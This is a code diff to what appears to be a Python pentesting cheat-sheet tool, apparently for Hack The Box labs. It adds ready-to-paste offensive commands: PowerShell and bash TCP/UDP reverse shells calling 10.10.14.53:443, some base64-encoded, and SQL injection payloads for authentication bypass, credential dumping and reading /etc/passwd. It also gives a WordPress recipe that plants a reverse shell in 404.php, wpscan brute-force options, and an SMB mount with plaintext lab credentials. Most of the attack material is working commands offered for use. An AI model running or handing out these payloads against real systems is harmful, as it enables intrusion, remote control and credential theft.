@@ -314,13 +314,13 @@ printf "\142\141\163\150\040\055\143\040\047\145\170\145\143\040\163\150\040\055
 echo "bash -c 'exec bash -i &>/dev/tcp/10.10.14.53/443 <&1'" | base64 -w0 into_clip
 echo YmFzaCAtYyAnZXhlYyBiYXNoIC1pICY+L2Rldi90Y3AvMTAuMTAuMTQuNTMvNDQzIDwmMScK | base64 -d | bash
 
-[*] Simple one liner to get a reverse Shell TCP
-
-powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('10.10.14.53',443);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
-
 [*] UDP Reverse Shell - Linux
 
 bash -c 'exec sh -i &>/dev/udp/10.10.14.53/443 <&1'
+
+[*] Simple one liner to get a reverse Shell TCP Windows
+
+powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('10.10.14.53',443);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
 """
 
 ######################################
@@ -373,7 +373,7 @@ lxc exec javali-container /bin/sh
 ######################################
 ######################################
 
-smbclient = Cheat("smbclient - Basics - TCP 445")
+smbclient = Cheat("smbclient - Basics - TCP 445 - cifs-utils (smb mount)")
 smbclient.category = "Tools"
 smbclient.output = """[*] smbclient - ftp-like client to access SMB/CIFS resources on servers
 
@@ -381,9 +381,15 @@ smbclient -L \\\\\\\\10.10.10.10\\\\                       # Enumera as pastas n
 smbclient -p 1234 \\\\\\\\10.10.10.10\\\\                  # Especifica uma porta diferente da normal (445)
 smbclient \\\\\\\\10.10.10.10\\\\directory                 # Tenta entrar para a pasta "directory" do share SMB
 smbclient -k \\\\\\\\10.10.10.10\\\\                       # Kerberos mode
-smbclient -U USERNAME -N \\\\\\\\10.10.10.10\\\\           # Tenta entrar com username sem password
-smbclient -U USERNAME -P PASSWORD \\\\\\\\10.10.10.10\\\\
-smbclient -W WORKGROUP \\\\\\\\10.10.10.10\\\\
+smbclient -U username -N \\\\\\\\10.10.10.10\\\\           # Tenta entrar com username sem password
+smbclient -L 10.10.10.10 -U "username%password"
+smbclient -W workgroup \\\\\\\\10.10.10.10\\\\
+
+# If they re to much directories and files, just mount them into the kali machine!
+apt install cifs-utils
+mkdir /mnt/smb
+mount -t cifs //10.10.10.10/folder /mnt/smb -o username=username,password=password,domain=WORKGROUP,rw
+mount -t cifs //10.10.10.59/ACCT /mnt/smb -o username=Finance,password=Acc0unting,domain=WORKGROUP,rw
 """
 
 ######################################
@@ -458,23 +464,23 @@ wpscan.category = "Tools"
 wpscan.output = """[*] WPScan - WordPress Security Scanner
 
 wpscan --url www.website.com              # Non-intrusive scan
-	-t 50                                 # Force 50 threads
-	--cookie-string COOKIE                # Cookie string to use in requests, format: cookie1=value1[; cookie2=value2]
-	--wp-content-dir /DIR                 # Specific correct /path when is not the default
-	--wp-plugins-dir /DIR                 # Specific correct /path when is not the default
-	--enumerate [OPTIONS]                 # Valid options: vp (Vulnerable plugins),
-										  #                ap (All plugins),
-										  #                p (Plugins),
-										  #                vt (Vulnerable themes),
-										  #                at (All themes),
-										  #                t (Themes),
-										  #                tt (Timthumbs),
-										  #                cb (Config backups),
-										  #                u (User IDs)
-										  # Format: [choice],[choice],[choice],...
-	-P, --passwords /path/wordlist.txt    # List of password to brute force. If no --usernames, user enumeration will be run
-	-U, --usernames /path/wordlist.txt    # List of usernames to brute force. Examples: 'a1', 'a1,a2,a3', '/tmp/a.txt'
-	--update                              # Update database
+    -t 50                                 # Force 50 threads
+    --cookie-string COOKIE                # Cookie string to use in requests, format: cookie1=value1[; cookie2=value2]
+    --wp-content-dir /DIR                 # Specific correct /path when is not the default
+    --wp-plugins-dir /DIR                 # Specific correct /path when is not the default
+    --enumerate [OPTIONS]                 # Valid options: vp (Vulnerable plugins),
+                                          #                ap (All plugins),
+                                          #                p (Plugins),
+                                          #                vt (Vulnerable themes),
+                                          #                at (All themes),
+                                          #                t (Themes),
+                                          #                tt (Timthumbs),
+                                          #                cb (Config backups),
+                                          #                u (User IDs)
+                                          # Format: [choice],[choice],[choice],...
+    -P, --passwords /path/wordlist.txt    # List of password to brute force. If no --usernames, user enumeration will be run
+    -U, --usernames /path/wordlist.txt    # List of usernames to brute force. Examples: 'a1', 'a1,a2,a3', '/tmp/a.txt'
+    --update                              # Update database
 
 # Examples:
 wpscan --url www.website.com
@@ -666,13 +672,16 @@ wfuzz -c --hc=404 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.tx
 mysqlBasicAndSqlInjection = Cheat("MySQL / SqlInjection")
 mysqlBasicAndSqlInjection.category = "Tools"
 mysqlBasicAndSqlInjection.output = """[*] Command                                                      # Description
+
 [*] General
+
 mysql -u root -h docker.hackthebox.eu -P 3306 -p                 # login to mysql database
 
 SHOW DATABASES                                                   # List available databases
 USE users                                                        # Switch to database
 
 [*] Tables
+
 CREATE TABLE logins (id INT, ...)                                # Add a new table
 SHOW TABLES                                                      # List available tables in current database
 DESCRIBE logins                                                  # Show table properties and columns
@@ -681,6 +690,7 @@ INSERT INTO table_name(column2, ...) VALUES (column2_value, ..)  # Add values to
 UPDATE table_name SET column1=newvalue1, ... WHERE <condition>   # Update table values
 
 [*] Columns
+
 SELECT * FROM table_name                                 # Show all columns in a table
 SELECT column1, column2 FROM table_name                  # Show specific columns in a table
 DROP TABLE logins                                        # Delete a table
@@ -690,6 +700,7 @@ ALTER TABLE logins MODIFY oldColumn DATE                 # Change column datatyp
 ALTER TABLE logins DROP oldColumn                        # Delete column
 
 [*] Output
+
 SELECT * FROM logins ORDER BY column_1              # Sort by column
 SELECT * FROM logins ORDER BY column_1 DESC         # Sort by column in descending order
 SELECT * FROM logins ORDER BY column_1 DESC, id ASC # Sort by two-columns
@@ -711,16 +722,19 @@ SELECT * FROM logins WHERE username LIKE 'admin%'   # List results where the nam
 [*] Payload                                        # Description
 
 # Auth Bypass
+
 admin' or '1'='1                                   # Basic Auth Bypass
 admin')-- -                                        # Basic Auth Bypass With comments
 
 [*] Union Injection
+
 ' order by 1-- -                                   # Detect number of columns using `order by`
 cn' UNION select 1,2,3-- -                         # Detect number of columns using Union injection
 cn' UNION select 1,@@version,3,4-- -               # Basic Union injection
 UNION select username, 2, 3, 4 from passwords-- -  # Union injection for 4 columns
 
 [*] DB Enumeration
+
 SELECT @@version                                   # Fingerprint MySQL with query output
 SELECT SLEEP(5)                                    # Fingerprint MySQL with no output
 cn' UNION select 1,database(),2,3-- -              # Current database name
@@ -735,6 +749,7 @@ cn' UNION select 1,COLUMN_NAME,TABLE_NAME,TABLE_SCHEMA from INFORMATION_SCHEMA.C
 cn' UNION select 1, username, password, 4 from dev.credentials-- -
 
 [*] Privileges
+
 # Find current user
 cn' UNION SELECT 1, user(), 3, 4-- -    
 # Find if user has admin privileges               
@@ -745,6 +760,7 @@ cn' UNION SELECT 1, grantee, privilege_type, is_grantable FROM information_schem
 cn' UNION SELECT 1, variable_name, variable_value, 4 FROM information_schema.global_variables where variable_name="secure_file_priv"-- -
 
 [*] File Injection
+
 # Read local file
 cn' UNION SELECT 1, LOAD_FILE("/etc/passwd"), 3, 4-- -
 # Write a string to a local file
@@ -764,11 +780,19 @@ nc -nlvp 4646 > file.f     # receiver
 nc <Ip> 4646 < file.f      # sender
 
 [*] File Transfere Techniques With FTP server
+
 # curlftpfs - mount a ftp host as a local directory
 # The program curlftpfs is a tool to mount remote ftp hosts as local directories. 
 # It connects to the host FTP server and maps its directory structure to the path directory.
 
 curlftpfs anonymous:senhalol@10.10.10.78 $(pwd) 
+
+[*] Simple Ftp Transfere
+
+# IMPORTANT NOTE: when download, use binary mode
+ftp > binary
+ftp > prompt off
+ftp > mget *
 """
 
 ######################################
@@ -793,7 +817,9 @@ webShell.output = """[*] Web Shell em PHP
 ######################################
 ######################################
 
-fakeShell = Cheat("Fake Shell in bash for web shell with parameter and RCE - urlencoded")
+fakeShell = Cheat(
+    "Fake Shell in bash for web shell with parameter and RCE - urlencoded"
+)
 fakeShell.category = "Web"
 fakeShell.output = """[*] Script in bash to simule shell via webshell RCE
 
@@ -816,4 +842,528 @@ while true; do
 	echo
 done
 
+"""
+
+######################################
+######################################
+
+treeWorpress = Cheat("Wordpress - WP - Tree/structure of basic wordpress path and files")
+treeWorpress.category = "Web"
+treeWorpress.output = """[*] Wordpress basic structure path and files
+
+sudo wget http://wordpress.org/latest.tar.gz
+tar -xf latest.tar.gz
+tree -L 3 --dirsfirst . -f -x
+
+.
+└── ./wordpress
+    ├── ./wordpress/wp-admin
+    │   ├── ./wordpress/wp-admin/css
+    │   ├── ./wordpress/wp-admin/images
+    │   ├── ./wordpress/wp-admin/includes
+    │   ├── ./wordpress/wp-admin/js
+    │   ├── ./wordpress/wp-admin/maint
+    │   ├── ./wordpress/wp-admin/network
+    │   ├── ./wordpress/wp-admin/user
+    │   ├── ./wordpress/wp-admin/about.php
+    │   ├── ./wordpress/wp-admin/admin-ajax.php
+    │   ├── ./wordpress/wp-admin/admin-footer.php
+    │   ├── ./wordpress/wp-admin/admin-functions.php
+    │   ├── ./wordpress/wp-admin/admin-header.php
+    │   ├── ./wordpress/wp-admin/admin.php
+    │   ├── ./wordpress/wp-admin/admin-post.php
+    │   ├── ./wordpress/wp-admin/async-upload.php
+    │   ├── ./wordpress/wp-admin/authorize-application.php
+    │   ├── ./wordpress/wp-admin/comment.php
+    │   ├── ./wordpress/wp-admin/credits.php
+    │   ├── ./wordpress/wp-admin/custom-background.php
+    │   ├── ./wordpress/wp-admin/custom-header.php
+    │   ├── ./wordpress/wp-admin/customize.php
+    │   ├── ./wordpress/wp-admin/edit-comments.php
+    │   ├── ./wordpress/wp-admin/edit-form-advanced.php
+    │   ├── ./wordpress/wp-admin/edit-form-blocks.php
+    │   ├── ./wordpress/wp-admin/edit-form-comment.php
+    │   ├── ./wordpress/wp-admin/edit-link-form.php
+    │   ├── ./wordpress/wp-admin/edit.php
+    │   ├── ./wordpress/wp-admin/edit-tag-form.php
+    │   ├── ./wordpress/wp-admin/edit-tags.php
+    │   ├── ./wordpress/wp-admin/erase-personal-data.php
+    │   ├── ./wordpress/wp-admin/export-personal-data.php
+    │   ├── ./wordpress/wp-admin/export.php
+    │   ├── ./wordpress/wp-admin/freedoms.php
+    │   ├── ./wordpress/wp-admin/import.php
+    │   ├── ./wordpress/wp-admin/index.php
+    │   ├── ./wordpress/wp-admin/install-helper.php
+    │   ├── ./wordpress/wp-admin/install.php
+    │   ├── ./wordpress/wp-admin/link-add.php
+    │   ├── ./wordpress/wp-admin/link-manager.php
+    │   ├── ./wordpress/wp-admin/link-parse-opml.php
+    │   ├── ./wordpress/wp-admin/link.php
+    │   ├── ./wordpress/wp-admin/load-scripts.php
+    │   ├── ./wordpress/wp-admin/load-styles.php
+    │   ├── ./wordpress/wp-admin/media-new.php
+    │   ├── ./wordpress/wp-admin/media.php
+    │   ├── ./wordpress/wp-admin/media-upload.php
+    │   ├── ./wordpress/wp-admin/menu-header.php
+    │   ├── ./wordpress/wp-admin/menu.php
+    │   ├── ./wordpress/wp-admin/moderation.php
+    │   ├── ./wordpress/wp-admin/ms-admin.php
+    │   ├── ./wordpress/wp-admin/ms-delete-site.php
+    │   ├── ./wordpress/wp-admin/ms-edit.php
+    │   ├── ./wordpress/wp-admin/ms-options.php
+    │   ├── ./wordpress/wp-admin/ms-sites.php
+    │   ├── ./wordpress/wp-admin/ms-themes.php
+    │   ├── ./wordpress/wp-admin/ms-upgrade-network.php
+    │   ├── ./wordpress/wp-admin/ms-users.php
+    │   ├── ./wordpress/wp-admin/my-sites.php
+    │   ├── ./wordpress/wp-admin/nav-menus.php
+    │   ├── ./wordpress/wp-admin/network.php
+    │   ├── ./wordpress/wp-admin/options-discussion.php
+    │   ├── ./wordpress/wp-admin/options-general.php
+    │   ├── ./wordpress/wp-admin/options-head.php
+    │   ├── ./wordpress/wp-admin/options-media.php
+    │   ├── ./wordpress/wp-admin/options-permalink.php
+    │   ├── ./wordpress/wp-admin/options.php
+    │   ├── ./wordpress/wp-admin/options-privacy.php
+    │   ├── ./wordpress/wp-admin/options-reading.php
+    │   ├── ./wordpress/wp-admin/options-writing.php
+    │   ├── ./wordpress/wp-admin/plugin-editor.php
+    │   ├── ./wordpress/wp-admin/plugin-install.php
+    │   ├── ./wordpress/wp-admin/plugins.php
+    │   ├── ./wordpress/wp-admin/post-new.php
+    │   ├── ./wordpress/wp-admin/post.php
+    │   ├── ./wordpress/wp-admin/press-this.php
+    │   ├── ./wordpress/wp-admin/privacy.php
+    │   ├── ./wordpress/wp-admin/privacy-policy-guide.php
+    │   ├── ./wordpress/wp-admin/profile.php
+    │   ├── ./wordpress/wp-admin/revision.php
+    │   ├── ./wordpress/wp-admin/setup-config.php
+    │   ├── ./wordpress/wp-admin/site-health-info.php
+    │   ├── ./wordpress/wp-admin/site-health.php
+    │   ├── ./wordpress/wp-admin/term.php
+    │   ├── ./wordpress/wp-admin/theme-editor.php
+    │   ├── ./wordpress/wp-admin/theme-install.php
+    │   ├── ./wordpress/wp-admin/themes.php
+    │   ├── ./wordpress/wp-admin/tools.php
+    │   ├── ./wordpress/wp-admin/update-core.php
+    │   ├── ./wordpress/wp-admin/update.php
+    │   ├── ./wordpress/wp-admin/upgrade-functions.php
+    │   ├── ./wordpress/wp-admin/upgrade.php
+    │   ├── ./wordpress/wp-admin/upload.php
+    │   ├── ./wordpress/wp-admin/user-edit.php
+    │   ├── ./wordpress/wp-admin/user-new.php
+    │   ├── ./wordpress/wp-admin/users.php
+    │   ├── ./wordpress/wp-admin/widgets-form-blocks.php
+    │   ├── ./wordpress/wp-admin/widgets-form.php
+    │   └── ./wordpress/wp-admin/widgets.php
+    ├── ./wordpress/wp-content
+    │   ├── ./wordpress/wp-content/plugins
+    │   ├── ./wordpress/wp-content/themes
+    │   └── ./wordpress/wp-content/index.php
+    ├── ./wordpress/wp-includes
+    │   ├── ./wordpress/wp-includes/assets
+    │   ├── ./wordpress/wp-includes/block-patterns
+    │   ├── ./wordpress/wp-includes/blocks
+    │   ├── ./wordpress/wp-includes/block-supports
+    │   ├── ./wordpress/wp-includes/certificates
+    │   ├── ./wordpress/wp-includes/css
+    │   ├── ./wordpress/wp-includes/customize
+    │   ├── ./wordpress/wp-includes/fonts
+    │   ├── ./wordpress/wp-includes/ID3
+    │   ├── ./wordpress/wp-includes/images
+    │   ├── ./wordpress/wp-includes/IXR
+    │   ├── ./wordpress/wp-includes/js
+    │   ├── ./wordpress/wp-includes/PHPMailer
+    │   ├── ./wordpress/wp-includes/pomo
+    │   ├── ./wordpress/wp-includes/random_compat
+    │   ├── ./wordpress/wp-includes/Requests
+    │   ├── ./wordpress/wp-includes/rest-api
+    │   ├── ./wordpress/wp-includes/SimplePie
+    │   ├── ./wordpress/wp-includes/sitemaps
+    │   ├── ./wordpress/wp-includes/sodium_compat
+    │   ├── ./wordpress/wp-includes/Text
+    │   ├── ./wordpress/wp-includes/theme-compat
+    │   ├── ./wordpress/wp-includes/widgets
+    │   ├── ./wordpress/wp-includes/admin-bar.php
+    │   ├── ./wordpress/wp-includes/atomlib.php
+    │   ├── ./wordpress/wp-includes/author-template.php
+    │   ├── ./wordpress/wp-includes/block-editor.php
+    │   ├── ./wordpress/wp-includes/block-patterns.php
+    │   ├── ./wordpress/wp-includes/blocks.php
+    │   ├── ./wordpress/wp-includes/block-template.php
+    │   ├── ./wordpress/wp-includes/block-template-utils.php
+    │   ├── ./wordpress/wp-includes/bookmark.php
+    │   ├── ./wordpress/wp-includes/bookmark-template.php
+    │   ├── ./wordpress/wp-includes/cache-compat.php
+    │   ├── ./wordpress/wp-includes/cache.php
+    │   ├── ./wordpress/wp-includes/canonical.php
+    │   ├── ./wordpress/wp-includes/capabilities.php
+    │   ├── ./wordpress/wp-includes/category.php
+    │   ├── ./wordpress/wp-includes/category-template.php
+    │   ├── ./wordpress/wp-includes/class-feed.php
+    │   ├── ./wordpress/wp-includes/class-http.php
+    │   ├── ./wordpress/wp-includes/class-IXR.php
+    │   ├── ./wordpress/wp-includes/class-json.php
+    │   ├── ./wordpress/wp-includes/class-oembed.php
+    │   ├── ./wordpress/wp-includes/class-phpass.php
+    │   ├── ./wordpress/wp-includes/class-phpmailer.php
+    │   ├── ./wordpress/wp-includes/class-pop3.php
+    │   ├── ./wordpress/wp-includes/class-requests.php
+    │   ├── ./wordpress/wp-includes/class-simplepie.php
+    │   ├── ./wordpress/wp-includes/class-smtp.php
+    │   ├── ./wordpress/wp-includes/class-snoopy.php
+    │   ├── ./wordpress/wp-includes/class-walker-category-dropdown.php
+    │   ├── ./wordpress/wp-includes/class-walker-category.php
+    │   ├── ./wordpress/wp-includes/class-walker-comment.php
+    │   ├── ./wordpress/wp-includes/class-walker-nav-menu.php
+    │   ├── ./wordpress/wp-includes/class-walker-page-dropdown.php
+    │   ├── ./wordpress/wp-includes/class-walker-page.php
+    │   ├── ./wordpress/wp-includes/class-wp-admin-bar.php
+    │   ├── ./wordpress/wp-includes/class-wp-ajax-response.php
+    │   ├── ./wordpress/wp-includes/class-wp-application-passwords.php
+    │   ├── ./wordpress/wp-includes/class-wp-block-editor-context.php
+    │   ├── ./wordpress/wp-includes/class-wp-block-list.php
+    │   ├── ./wordpress/wp-includes/class-wp-block-parser.php
+    │   ├── ./wordpress/wp-includes/class-wp-block-pattern-categories-registry.php
+    │   ├── ./wordpress/wp-includes/class-wp-block-patterns-registry.php
+    │   ├── ./wordpress/wp-includes/class-wp-block.php
+    │   ├── ./wordpress/wp-includes/class-wp-block-styles-registry.php
+    │   ├── ./wordpress/wp-includes/class-wp-block-supports.php
+    │   ├── ./wordpress/wp-includes/class-wp-block-template.php
+    │   ├── ./wordpress/wp-includes/class-wp-block-type.php
+    │   ├── ./wordpress/wp-includes/class-wp-block-type-registry.php
+    │   ├── ./wordpress/wp-includes/class-wp-comment.php
+    │   ├── ./wordpress/wp-includes/class-wp-comment-query.php
+    │   ├── ./wordpress/wp-includes/class-wp-customize-control.php
+    │   ├── ./wordpress/wp-includes/class-wp-customize-manager.php
+    │   ├── ./wordpress/wp-includes/class-wp-customize-nav-menus.php
+    │   ├── ./wordpress/wp-includes/class-wp-customize-panel.php
+    │   ├── ./wordpress/wp-includes/class-wp-customize-section.php
+    │   ├── ./wordpress/wp-includes/class-wp-customize-setting.php
+    │   ├── ./wordpress/wp-includes/class-wp-customize-widgets.php
+    │   ├── ./wordpress/wp-includes/class-wp-date-query.php
+    │   ├── ./wordpress/wp-includes/class.wp-dependencies.php
+    │   ├── ./wordpress/wp-includes/class-wp-dependency.php
+    │   ├── ./wordpress/wp-includes/class-wp-editor.php
+    │   ├── ./wordpress/wp-includes/class-wp-embed.php
+    │   ├── ./wordpress/wp-includes/class-wp-error.php
+    │   ├── ./wordpress/wp-includes/class-wp-fatal-error-handler.php
+    │   ├── ./wordpress/wp-includes/class-wp-feed-cache.php
+    │   ├── ./wordpress/wp-includes/class-wp-feed-cache-transient.php
+    │   ├── ./wordpress/wp-includes/class-wp-hook.php
+    │   ├── ./wordpress/wp-includes/class-wp-http-cookie.php
+    │   ├── ./wordpress/wp-includes/class-wp-http-curl.php
+    │   ├── ./wordpress/wp-includes/class-wp-http-encoding.php
+    │   ├── ./wordpress/wp-includes/class-wp-http-ixr-client.php
+    │   ├── ./wordpress/wp-includes/class-wp-http-proxy.php
+    │   ├── ./wordpress/wp-includes/class-wp-http-requests-hooks.php
+    │   ├── ./wordpress/wp-includes/class-wp-http-requests-response.php
+    │   ├── ./wordpress/wp-includes/class-wp-http-response.php
+    │   ├── ./wordpress/wp-includes/class-wp-http-streams.php
+    │   ├── ./wordpress/wp-includes/class-wp-image-editor-gd.php
+    │   ├── ./wordpress/wp-includes/class-wp-image-editor-imagick.php
+    │   ├── ./wordpress/wp-includes/class-wp-image-editor.php
+    │   ├── ./wordpress/wp-includes/class-wp-list-util.php
+    │   ├── ./wordpress/wp-includes/class-wp-locale.php
+    │   ├── ./wordpress/wp-includes/class-wp-locale-switcher.php
+    │   ├── ./wordpress/wp-includes/class-wp-matchesmapregex.php
+    │   ├── ./wordpress/wp-includes/class-wp-metadata-lazyloader.php
+    │   ├── ./wordpress/wp-includes/class-wp-meta-query.php
+    │   ├── ./wordpress/wp-includes/class-wp-network.php
+    │   ├── ./wordpress/wp-includes/class-wp-network-query.php
+    │   ├── ./wordpress/wp-includes/class-wp-object-cache.php
+    │   ├── ./wordpress/wp-includes/class-wp-oembed-controller.php
+    │   ├── ./wordpress/wp-includes/class-wp-oembed.php
+    │   ├── ./wordpress/wp-includes/class-wp-paused-extensions-storage.php
+    │   ├── ./wordpress/wp-includes/class-wp.php
+    │   ├── ./wordpress/wp-includes/class-wp-post.php
+    │   ├── ./wordpress/wp-includes/class-wp-post-type.php
+    │   ├── ./wordpress/wp-includes/class-wp-query.php
+    │   ├── ./wordpress/wp-includes/class-wp-recovery-mode-cookie-service.php
+    │   ├── ./wordpress/wp-includes/class-wp-recovery-mode-email-service.php
+    │   ├── ./wordpress/wp-includes/class-wp-recovery-mode-key-service.php
+    │   ├── ./wordpress/wp-includes/class-wp-recovery-mode-link-service.php
+    │   ├── ./wordpress/wp-includes/class-wp-recovery-mode.php
+    │   ├── ./wordpress/wp-includes/class-wp-rewrite.php
+    │   ├── ./wordpress/wp-includes/class-wp-role.php
+    │   ├── ./wordpress/wp-includes/class-wp-roles.php
+    │   ├── ./wordpress/wp-includes/class.wp-scripts.php
+    │   ├── ./wordpress/wp-includes/class-wp-session-tokens.php
+    │   ├── ./wordpress/wp-includes/class-wp-simplepie-file.php
+    │   ├── ./wordpress/wp-includes/class-wp-simplepie-sanitize-kses.php
+    │   ├── ./wordpress/wp-includes/class-wp-site.php
+    │   ├── ./wordpress/wp-includes/class-wp-site-query.php
+    │   ├── ./wordpress/wp-includes/class.wp-styles.php
+    │   ├── ./wordpress/wp-includes/class-wp-taxonomy.php
+    │   ├── ./wordpress/wp-includes/class-wp-tax-query.php
+    │   ├── ./wordpress/wp-includes/class-wp-term.php
+    │   ├── ./wordpress/wp-includes/class-wp-term-query.php
+    │   ├── ./wordpress/wp-includes/class-wp-text-diff-renderer-inline.php
+    │   ├── ./wordpress/wp-includes/class-wp-text-diff-renderer-table.php
+    │   ├── ./wordpress/wp-includes/class-wp-theme-json.php
+    │   ├── ./wordpress/wp-includes/class-wp-theme-json-resolver.php
+    │   ├── ./wordpress/wp-includes/class-wp-theme.php
+    │   ├── ./wordpress/wp-includes/class-wp-user-meta-session-tokens.php
+    │   ├── ./wordpress/wp-includes/class-wp-user.php
+    │   ├── ./wordpress/wp-includes/class-wp-user-query.php
+    │   ├── ./wordpress/wp-includes/class-wp-user-request.php
+    │   ├── ./wordpress/wp-includes/class-wp-walker.php
+    │   ├── ./wordpress/wp-includes/class-wp-widget-factory.php
+    │   ├── ./wordpress/wp-includes/class-wp-widget.php
+    │   ├── ./wordpress/wp-includes/class-wp-xmlrpc-server.php
+    │   ├── ./wordpress/wp-includes/comment.php
+    │   ├── ./wordpress/wp-includes/comment-template.php
+    │   ├── ./wordpress/wp-includes/compat.php
+    │   ├── ./wordpress/wp-includes/cron.php
+    │   ├── ./wordpress/wp-includes/date.php
+    │   ├── ./wordpress/wp-includes/default-constants.php
+    │   ├── ./wordpress/wp-includes/default-filters.php
+    │   ├── ./wordpress/wp-includes/default-widgets.php
+    │   ├── ./wordpress/wp-includes/deprecated.php
+    │   ├── ./wordpress/wp-includes/embed.php
+    │   ├── ./wordpress/wp-includes/embed-template.php
+    │   ├── ./wordpress/wp-includes/error-protection.php
+    │   ├── ./wordpress/wp-includes/feed-atom-comments.php
+    │   ├── ./wordpress/wp-includes/feed-atom.php
+    │   ├── ./wordpress/wp-includes/feed.php
+    │   ├── ./wordpress/wp-includes/feed-rdf.php
+    │   ├── ./wordpress/wp-includes/feed-rss2-comments.php
+    │   ├── ./wordpress/wp-includes/feed-rss2.php
+    │   ├── ./wordpress/wp-includes/feed-rss.php
+    │   ├── ./wordpress/wp-includes/formatting.php
+    │   ├── ./wordpress/wp-includes/functions.php
+    │   ├── ./wordpress/wp-includes/functions.wp-scripts.php
+    │   ├── ./wordpress/wp-includes/functions.wp-styles.php
+    │   ├── ./wordpress/wp-includes/general-template.php
+    │   ├── ./wordpress/wp-includes/http.php
+    │   ├── ./wordpress/wp-includes/https-detection.php
+    │   ├── ./wordpress/wp-includes/https-migration.php
+    │   ├── ./wordpress/wp-includes/kses.php
+    │   ├── ./wordpress/wp-includes/l10n.php
+    │   ├── ./wordpress/wp-includes/link-template.php
+    │   ├── ./wordpress/wp-includes/load.php
+    │   ├── ./wordpress/wp-includes/locale.php
+    │   ├── ./wordpress/wp-includes/media.php
+    │   ├── ./wordpress/wp-includes/media-template.php
+    │   ├── ./wordpress/wp-includes/meta.php
+    │   ├── ./wordpress/wp-includes/ms-blogs.php
+    │   ├── ./wordpress/wp-includes/ms-default-constants.php
+    │   ├── ./wordpress/wp-includes/ms-default-filters.php
+    │   ├── ./wordpress/wp-includes/ms-deprecated.php
+    │   ├── ./wordpress/wp-includes/ms-files.php
+    │   ├── ./wordpress/wp-includes/ms-functions.php
+    │   ├── ./wordpress/wp-includes/ms-load.php
+    │   ├── ./wordpress/wp-includes/ms-network.php
+    │   ├── ./wordpress/wp-includes/ms-settings.php
+    │   ├── ./wordpress/wp-includes/ms-site.php
+    │   ├── ./wordpress/wp-includes/nav-menu.php
+    │   ├── ./wordpress/wp-includes/nav-menu-template.php
+    │   ├── ./wordpress/wp-includes/option.php
+    │   ├── ./wordpress/wp-includes/pluggable-deprecated.php
+    │   ├── ./wordpress/wp-includes/pluggable.php
+    │   ├── ./wordpress/wp-includes/plugin.php
+    │   ├── ./wordpress/wp-includes/post-formats.php
+    │   ├── ./wordpress/wp-includes/post.php
+    │   ├── ./wordpress/wp-includes/post-template.php
+    │   ├── ./wordpress/wp-includes/post-thumbnail-template.php
+    │   ├── ./wordpress/wp-includes/query.php
+    │   ├── ./wordpress/wp-includes/registration-functions.php
+    │   ├── ./wordpress/wp-includes/registration.php
+    │   ├── ./wordpress/wp-includes/rest-api.php
+    │   ├── ./wordpress/wp-includes/revision.php
+    │   ├── ./wordpress/wp-includes/rewrite.php
+    │   ├── ./wordpress/wp-includes/robots-template.php
+    │   ├── ./wordpress/wp-includes/rss-functions.php
+    │   ├── ./wordpress/wp-includes/rss.php
+    │   ├── ./wordpress/wp-includes/script-loader.php
+    │   ├── ./wordpress/wp-includes/session.php
+    │   ├── ./wordpress/wp-includes/shortcodes.php
+    │   ├── ./wordpress/wp-includes/sitemaps.php
+    │   ├── ./wordpress/wp-includes/spl-autoload-compat.php
+    │   ├── ./wordpress/wp-includes/taxonomy.php
+    │   ├── ./wordpress/wp-includes/template-canvas.php
+    │   ├── ./wordpress/wp-includes/template-loader.php
+    │   ├── ./wordpress/wp-includes/template.php
+    │   ├── ./wordpress/wp-includes/theme-i18n.json
+    │   ├── ./wordpress/wp-includes/theme.json
+    │   ├── ./wordpress/wp-includes/theme.php
+    │   ├── ./wordpress/wp-includes/theme-templates.php
+    │   ├── ./wordpress/wp-includes/update.php
+    │   ├── ./wordpress/wp-includes/user.php
+    │   ├── ./wordpress/wp-includes/vars.php
+    │   ├── ./wordpress/wp-includes/version.php
+    │   ├── ./wordpress/wp-includes/widgets.php
+    │   ├── ./wordpress/wp-includes/wlwmanifest.xml
+    │   ├── ./wordpress/wp-includes/wp-db.php
+    │   └── ./wordpress/wp-includes/wp-diff.php
+    ├── ./wordpress/index.php
+    ├── ./wordpress/license.txt
+    ├── ./wordpress/readme.html
+    ├── ./wordpress/wp-activate.php
+    ├── ./wordpress/wp-blog-header.php
+    ├── ./wordpress/wp-comments-post.php
+    ├── ./wordpress/wp-config-sample.php
+    ├── ./wordpress/wp-cron.php
+    ├── ./wordpress/wp-links-opml.php
+    ├── ./wordpress/wp-load.php
+    ├── ./wordpress/wp-login.php
+    ├── ./wordpress/wp-mail.php
+    ├── ./wordpress/wp-settings.php
+    ├── ./wordpress/wp-signup.php
+    ├── ./wordpress/wp-trackback.php
+    └── ./wordpress/xmlrpc.php
+
+36 directories, 320 files
+"""
+
+######################################
+######################################
+
+reverseShellWordpress = Cheat("RCE - Wordpress (WP)")
+reverseShellWordpress.category = "Web"
+reverseShellWordpress.output = """[*] When authenticated, we can change the WordPress 404.php to get RCE
+
+# edit 404.php
+http://10.10.10.37/wp-admin/theme-editor.php?file=404.php&theme=twentyseventeen&scrollto=0
+
+# Put something like a RCE, or a reverse shell directely in between the 404.php code...
+	system("bash -c 'bash -i >& /dev/tcp/10.10.14.53/443 0>&1'");
+
+# Access to 404.php
+http://10.10.10.37/?p=404.php # Or http://10.10.10.37/?p=404.php&cmd=whoami if is a RCE
+"""
+
+######################################
+######################################
+
+ffuf = Cheat("ffuf - Fuzz Faster U Fool")
+ffuf.category = "Tools"
+ffuf.output = """[*] Virtual Host Discovery (without DNS records)
+
+# Start by figurinf out the response length of false positive
